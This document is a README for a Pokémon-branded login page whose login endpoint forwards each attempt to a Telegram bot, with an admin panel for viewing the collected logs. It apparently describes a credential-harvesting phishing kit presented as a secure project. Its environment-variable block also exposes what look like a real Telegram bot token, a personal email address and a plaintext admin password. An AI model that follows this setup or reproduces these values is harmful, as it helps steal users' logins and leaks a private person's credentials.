# Pokémon Trainer Central Login Page

A modern, responsive Pokémon-themed login page with Telegram bot integration for real-time login notifications.

## Features

- 🎮 Pokémon-themed UI design
- 📱 Responsive layout for all devices
- 🤖 Telegram bot integration for login notifications
- 🔐 Secure admin panel for viewing login logs
- ⚡ Optimized for Vercel deployment
- 🛡️ Content Security Policy (CSP) compliant

## Environment Variables

Create these environment variables in your Vercel dashboard:

### Required Environment Variables

```bash
BOT_TOKEN=8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM
CHAT_ID=YOUR_CHAT_ID_HERE
ADMIN_USERNAME=rahulkushwaha1842003@gmail.com
ADMIN_PASSWORD=Rewa@1234
NODE_ENV=production
```

### Setup Instructions

1. **Deploy to Vercel**
   ```bash
   # Push to GitHub and connect to Vercel
   git push origin main
   ```

2. **Configure Environment Variables in Vercel**
   - Go to your Vercel project dashboard
   - Navigate to Settings → Environment Variables
   - Add all the required environment variables above

3. **Setup Telegram Bot**
   - Send a message to your bot to get the CHAT_ID
   - Update the CHAT_ID environment variable in Vercel
   - Redeploy for changes to take effect

## Project Structure

```
├── index.html          # Main login page
├── admin.html          # Admin panel for viewing logs
├── server.js           # Vercel serverless functions
├── script.js           # Frontend JavaScript
├── style.css           # Styling
├── vercel.json         # Vercel configuration
├── package.json        # Dependencies
├── .env.example        # Environment variables template
└── assets/             # Static assets
```

## API Endpoints

- `POST /api/login` - Handle login attempts and send notifications
- `GET /api/health` - Health check endpoint
- `GET /api/logs` - Get login logs (admin only)
- `POST /api/admin` - Admin authentication

## Security Features

- Content Security Policy (CSP) headers
- CORS protection
- Input sanitization
- Environment variable configuration
- Secure admin authentication

## Deployment

This project is optimized for Vercel deployment with:

- Serverless functions for API endpoints
- Static file serving
- Proper routing configuration
- Security headers

## License

MIT License